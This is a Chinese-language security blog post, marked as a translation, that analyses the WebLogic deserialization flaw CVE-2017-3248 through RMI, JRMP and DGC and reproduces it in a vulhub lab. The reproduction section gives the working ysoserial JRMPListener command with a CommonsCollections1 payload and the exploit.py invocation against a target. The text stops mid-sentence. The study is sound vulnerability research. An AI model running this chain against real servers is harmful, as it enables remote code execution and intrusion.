# CVE-2017-3248——WebLogic反序列化初探
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 一、原理
###  （一）概述
前面我们提到， CVE-2015-4852往后有一系列漏洞都是立足于对其补丁的绕过的，CVE-2017-3248也是其中之一。
WebLogic
使用这种黑名单的方式试图过滤掉危险的类的这种修复方式有一定的效果，但也存在被绕过的风险。根据学习，我了解到的绕过的思路有如下几种：一是找到可用且未在黑名单之内的新类（新类要能构造链实现任意代码执行），此时的payload为新的；二是找到一种类，这种类可以反序列化自身成员变量，此时可以封装旧的payload；三是找到未在黑名单之内的新反序列化点，此时可以发旧的payload。CVE-2016-3510和CVE-2016-0638主要是基于第二种思路，
CVE-2017-3248 则是基于第三种思路，通过JRMP 协议达到执行任意反序列化 payload。
如果CVE-2015-4852是这个系列的开篇，后面的漏洞都是它的后续的话，CVE-2017-3248则可以说是基于CVE-2015-4852的绕过，并开启了一个新系列。2017年之后的漏洞多有通过构造JRMP服务器监听进行反向触发的特点。举个不恰当的例子，神探狄仁杰一的第一章“使团惊魂”开启了神探狄仁杰整个系列，神探狄仁杰二的第一章“关河疑影”则是基于“使团惊魂”的后续剧情开启了新的篇章。  
说句题外话，结合对调用栈的分析，个人感觉，这一系列漏洞的利用点随着时间顺序正在逐渐用到底层协议方面的内容。
###  （二）CVE-2017-3248
先讲下需要的知识：
**1、RMI**
远程方法调用(Remote Method Invocation)。能够让在某个java虚拟机上的对象像调用本地对象一样调用另一个java
虚拟机中的对象上的方法。
宏观上看，RMI远程调用步骤：
1）客户对象调用客户端辅助对象上的方法；
2）客户端辅助对象打包调用信息（变量，方法名），通过网络发送给服务端辅助对象；
3）服务端辅助对象将客户端辅助对象发送来的信息解包，找出真正被调用的方法以及该方法所在对象；
4）调用真正服务对象上的真正方法，并将结果返回给服务端辅助对象；
5）服务端辅助对象将结果打包，发送给客户端辅助对象；
6）客户端辅助对象将返回值解包，返回给客户对象；
7）客户对象获得返回值；
详细来看，对于Client来说，他甚至可以不知道有Server的存在，所有他需要的只是一个stub，对于Client来说，调用远程方法就是调用Stub的方法，
从我们一个局外人的角度上看，数据是在Client和Server之间是横向流动的，但是微观上看整个流程必有网络层面的大量的纵向流动，一个请求先从Client发出，交给Stub，走过Transport
Layer之后交由Skeleton，最后到Server，Server调用相应方法，然后将结果原路返回，流程如下：
1.Server监听一个端口，此端口由JVM随机选择（这一点在ysoserial中可见）；
2.Client对于Server上的远程对象的位置信息（通信地址和端口）一无所知，只知道向stub发起请求，而stub中包含了这些信息，并封装了底层网络操作；
3.Client调用Stub上对应的方法；
4.Stub连接到Server监听的通信端口并提交方法的参数；
5.Server上执行具体的方法，并将结果原路返回给Stub；
对于Client来说，远程调用的执行结果是Stub给它的，从Client看来就好像是Stub在本地执行了这个方法一样。
这一部分的原理有很多大佬讲的很清楚了，不再赘述，只提一点：stub可以先从RMIRegister中获取到Server中对象的信息，进而对其进行调用。在网络上，调用所需的参数（client给RMIregister、RMIRegister给Server）和调用的结果（Server给RMIregister、RMIregister给Client）是以序列化字节流的格式传输的，也就为攻击提供了可能。
RMI依赖于ip与端口，且依赖于Java远程消息交换协议JRMP（Java Remote Messaging
Protocol），该协议为java定制，要求服务端与客户端都为java编写。
**2、JRMP**
Java远程消息交换协议（Java Remote MessagingProtocol），是特定于 Java 技术的、用于查找和引用远程对象的协议。这是运行在
Java 远程方法调用 RMI 之下、TCP/IP
之上的线路层协议。作为一个Java特有的、适用于Java之间远程调用的基于流的协议，要求客户端和服务器上都使用Java对象。
###  （三）原理
**1.原理**
结合我的调试过程与自己的理解谈谈我对原理的粗浅的认识。
整个过程涉及到的内容跟之前相比已经比较偏底层了，涉及到RMI和DGC的机制，RMI的一些过程在调试过程中会有显现，我想简单讲下和DGC有关的部分，之前没有遇到过。
具体来讲，这里利用RMI，让victim反序列化UnicastRef这个类，使该类发起一个JRMP连接到恶意服务端上，从而在DGC层造成一个反序列化，因为DGC层的filter是在反序列化之后进行设置的，所以之前设置的黑名单过滤没有作用，
正常情况下，DGC server通过实现引用计数接口来实现内存管理，当DGC client调用一个远程对象（增加一个引用计数）时，需要调用DGC
server的dirty()函数，然后dirty()返回给client一个lease(DGCClient.vmid,
DGCClient.leaseValue)；Client需要不断调用dirty()函数来更新其对相应对象的引用的expire；当Client不再需要这个对象时，需要调用DGC
server的clean()函数。
对于DGC server来说，其关键部分是dirty()和clean()，对于DGC
Client来说，关键函数是registerRefs()，这又和RMI的内容有关，对于这个漏洞我们只需要知道RMI调用的对象需要register即可，不必过多研究。
我们知道，攻击过程涉及三方，attacker（这里所指的攻击方仅发送payload使victim向JRMP Server或者叫JRMP
Listener发起请求）、JRMP Server（或者叫JRMP
Listener）和victim，attacker使用payload攻击victim，victim通过RMI向DGC server（此处为JRMP
Server）发起dirty()请求，但这里返回的不再是一个常规的lease，而是构造好的数据（甚至和前面的几个CVE相比没有什么差别），victim收到后，进行反序列化，从而触发RCE。
这一系列漏洞同宗同源，都可以看做是一条链的变种，都可以绕过所谓的黑名单，感觉颇有点像黑名单只卡住了整条链上的一个点，所以换个其他的切入点就能绕过。
**2.工具原理**
这里可以分两部分，一是JRMP Server的部分，二是attacker的部分，分别对应着ysoserial中的
JRMPListener和JRMPClient。
**（1）JRMPListener**
这里遇到了一个离谱的事情，就是在IDEA里只有用JDK8才能成功编译ysoserial，平常跑ysoserial.jar的JDK7会有错。
配置如下，
先看一下main的源码，
下面结合调试看一下具体的流程，
先跟进makePayloadObject，
跟到return，
可以看到，这里和之前CVE-2015-4852使用的payload别无二致，都是CommonsCollections1类型的AnnotationInvocationHandler。
继续跟进，
开启了本地监听，接下来的run函数会一直监听。
若是接收到请求，先判断请求类型，若为DGC则会将payload返回出去。
可以看到，返回的就是AnnotationInvocationHandler，
这一部分的功能比较好理解，不再多做解释。
**（2）JRMPClient**
上一部分是向发起DGC请求的RMI Registry返回一个恶意对象让其解析，这一部分即是为了使靶机能够向JRMP Listener发起DGC请求。
这一部分的功能实现在payload目录下JRMPClient里。
这里主要就是从TCP层开始向上构造，封装这个装有UnicastRef的实例，发送victim，让它向JRMP Server发起DGC请求。
## 二、调试
###  （一）环境搭建
在正式开始前记录在启动或停止docker中WebLogic服务时遇到的两个小问题，
删除servers/AdminServer/tmp/AdminServer.lok即可
解决方法不难，删除对应目录下的 embeddedldap.lok 即可。
很奇怪，之前没有遇到过类似的问题，不知是不是异常退出导致的。
此处的搭建可以直接使用vulhub的环境
    docker-compose up -d
###  （二）复现
搭建好后，访问 ip:7001/console
然后启动一个JRMP Server:
    java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections1 'touch /tmp/aug'
其中，7777是JRMP Server监听的端口，’touch /tmp/aug’即为想执行的命令，。
由于我这里是在Ubuntu上开启的docker，所以这里要在Ubuntu上启动一个JRMP
Server（我怀疑这是一个坑，起初没有注意这个问题，直接在Windows上开启了一个JRMP
Server，虽然docker无法ping到Windows，Windows上的JRMP
Server却能收到连接，但无法复现。后来换成在Ubuntu上启动JRMP Server，则可复现成功）。
然后，使用python2运行，
[exploit.py](https://www.exploit-db.com/exploits/44553)
向目标Weblogic（ip:7001/console）发送数据包：
    python2 exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]
其中，victim ip和victim port是目标weblogic的IP和端口，path to